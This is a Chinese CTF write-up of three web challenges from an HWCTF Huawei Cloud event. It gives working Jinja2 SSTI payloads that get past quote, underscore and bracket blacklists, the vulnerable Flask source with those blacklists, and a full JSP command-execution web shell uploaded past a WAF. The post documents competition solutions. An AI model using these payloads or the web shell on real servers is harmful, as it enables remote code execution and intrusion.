
title:  HWCTF-华为云场WP
categories: [CTF]
tags: [wp,web]

---
突然发现柴鸡的我除了ssti其他都不会,嘤嘤嘤( •̥́ ˍ •̀ू )
<!--more-->

## mine1_1

题目一开,经过测试发现是一道python2 ssti,但发现过滤 单引号、双引号这导致我们不能直接构造字符串来传参数，并且ban了`_`让我们对`__class__`这些内置属性访问产生了烦恼，同时ban了`[`让我们对字典的操作受到影响。但好在符号和关键字没有ban全。

### 字符串问题

1.我们可以利用request对象属性来传递参数。

虽然`args`、`host`、`headers`、`json`、`_`等字符被ban，但是还有cookies与values没有被ban。我们可以通过cookie传递或get参数。（ps：values在同时处理get与post的数据）

2.我们也可以利用dict 与join的特性来构筑字符串。例：

```python
dict(args=1)|join  ## "args"
```

但这个不能绕出`_`，想要`_`要和上面面的1结合访问：

```python
(request|attr(dict(args=1)|join)).x  ## request.args.x
```

然后get提交参数。

### 内置属性访问

由于ban了`_`、`"`、`‘`、`[`但我们还是可以利用`|attr`+ 字符串的方式来访问。



### 字典的操作

由于ban  `[` 因此要对字典进行取数据时要通过pop或`__getitem__`来取值。

但要注意的是pop 的作用是<u>**删除字典给定键 key 及对应的值，返回值为被删除的值**</u>所以慎重。

例如：`__globals__`后的字典pop `__builtins__`会因为无法删除而抱错。同时就会能访问取值，pop一次后该键值也可能被删除。

（做题时一开始用了pop卡了半天）

所以安全的访问还是用`__getitem__`

对了，还有`|attr`与`__getattribute__`只处理属性，不会对字典取值。

所以payload，如下：（做题时，智障了忘了cookies与values绕了下）：

```
{{((((((22|attr((request|attr((dict(ar=1,gs=1)|join))).x))|attr((request|attr((dict(ar=1,gs=1)|join))).x2))|attr((request|attr((dict(ar=1,gs=1)|join))).x3)()).pop(71)|attr((request|attr((dict(ar=1,gs=1)|join))).x4))|attr((request|attr((dict(ar=1,gs=1)|join))).x5))|attr((request|attr((dict(ar=1,gs=1)|join))).x7)(dict(sys=1)|join)).modules}}&x=__class__&x2=__base__&x3=__subclasses__&x4=__init__&x5=__globals__&x6=pop&x7=__getitem__
```

![image-20201222000742752]( image-20201222000742752.png)

然后是趴下的原码：

```python
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask,render_template,redirect
from flask import request
import urllib
import sys
import os
from jinja2 import Template

app = Flask(__name__)

def safe_msg(msg):
    if 'args' in msg or '_' in msg or '[' in msg or 'path' in msg or 'host' in msg or 'headers' in msg or 'endpoint' in msg or 'json' in msg or 'user_agent' in msg or '"' in msg or "'" in msg or "%" in msg:
        return False
    else:
        return True

@app.route("/", methods=['GET'])
def index():
    return render_template("index.html")


@app.route("/over", methods=['GET'])
def over():
    return render_template('over.html')


@app.route("/success", methods=['GET'])
def success():
    msg = request.args.get("msg")
    if(msg == None):
        msg = 'anonymous'
    if safe_msg(msg):
        t = Template("Good Job! " + msg + " . But sorry, there isn't flag")
    else:
        t = Template("You look dangerous.....")
    return t.render(request=request)


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0', port=8000)

```



## mine2

emm，这道感觉比上道要简单多(可能是python3环境有太湖杯非预期一把梭)。

过滤`.`、`[`、`_`但是我们依然可以用`|attr`来取属性。

同时，由于有双引号我们可以通过python3 字符格式化特性用16进制或8进制来绕waf。

同时，没有`{ {`我们只能用`{ %`我们可以用

```python
{% print( )%}
```

来回显字符。

payload：

![image-20201222002412744]( image-20201222002412744.png)

```python
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask,render_template,redirect
from flask import request
import urllib
import sys
import os
from jinja2 import Template

app = Flask(__name__)

def safe_msg(msg):
    blacklist = ['~','set','or','args','_','[','request','lipsum','=','chr','json','g','.',"'",'{{','u','get',' ',',','*','^','&','$','#','@','!']
    for i in blacklist:
        if i in msg: 
            return False
    return True

@app.route("/", methods=['GET'])
def index():
    return render_template("index.html")


@app.route("/over", methods=['GET'])
def over():
    return render_template('over.html')


@app.route("/success", methods=['GET'])
def success():
    msg = request.args.get("msg")
    if(msg == None):
        msg = 'anonymous'
    if safe_msg(msg):
        t = Template("Good Job! " + msg + " . But sorry, there isn't flag")
    else:
        t = Template("You look dangerous.....")
    return t.render(request=request)


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0', port=8000)
```



## webshell_1 

一道jsp 文件上传，有waf。多次上传马，就躲过waf。（可能条件竞争）马如下：

```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

![image-20201222002704598]( image-20201222002704598.png)

